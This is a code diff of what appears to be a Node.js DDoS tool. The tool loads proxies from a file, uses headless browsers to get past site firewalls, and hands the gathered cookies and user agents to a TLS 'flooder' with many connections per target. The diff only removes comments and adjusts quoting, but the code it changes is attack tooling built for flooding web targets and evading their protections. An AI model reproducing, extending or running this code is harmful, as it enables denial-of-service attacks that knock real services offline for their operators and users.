@@ -110,10 +110,7 @@ var VarsDefinetions = {
 };
 
 function add_uss(user) {
-  // if (user_agent.includes("Mozilla/5.0") == false) {
   user_agent = user;
-  // } else {
-  // }
 }
 
 function log(string) {
@@ -144,7 +141,6 @@ try {
   ProxyFILE = fs.readFileSync("proxy.txt").toString().match(/\S+/g);
 }
 const proxies_total = ProxyFILE.length - 2;
-//const ProxyFILE = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
 log(`Loaded ${proxies_total + 2}`);
 
 function ProxyGenerate() {
@@ -185,7 +181,6 @@ var launch_browser = async function launch_browser(Extra = {}) {
         IdBrowser +
         "]" +
         ` Unknown error occured while trying to bypass firewall with ip: ${Proxy}`
-          
     );
     ListIDS.push(IdBrowser);
     return;
@@ -266,13 +261,11 @@ if (ModeATTACK == "browser") {
   log(`[info] Flooder started`);
 } else {
   console.clear();
-  log('Invalid mode selected, valid modes: tls, browser');
+  log("Invalid mode selected, valid modes: tls, browser");
   process.exit();
 }
 
 function setFlooder(ip, cookie, ua) {
-  //clearInterval(myInterval);
-
   if (CustomsARGVS.postdata) {
     PostaMOD = encodeURI(CustomsARGVS.postdata);
   }
@@ -294,12 +287,11 @@ function setFlooder(ip, cookie, ua) {
       cookie_CTM = ";" + CustomsARGVS.customCookie;
     }
   } catch (error) {
-    cookie_CTM = ""; //null
+    cookie_CTM = "";
   }
 
   require("./browser/flooder.js").flooderTLS(
     (option = {
-      //DATABROWSER: browser_saves,
       ip: ip,
       cookie: cookie,
       ua: ua,
@@ -315,8 +307,6 @@ function setFlooder(ip, cookie, ua) {
       connections: connections || 32,
     })
   );
-
-  //log(`[info] Flooder started with ${(browser_saves.split("#").length - 1) / 2} tokens`);
   log(`[info]` + ` Flooder started with ${ip}`);
 }
 
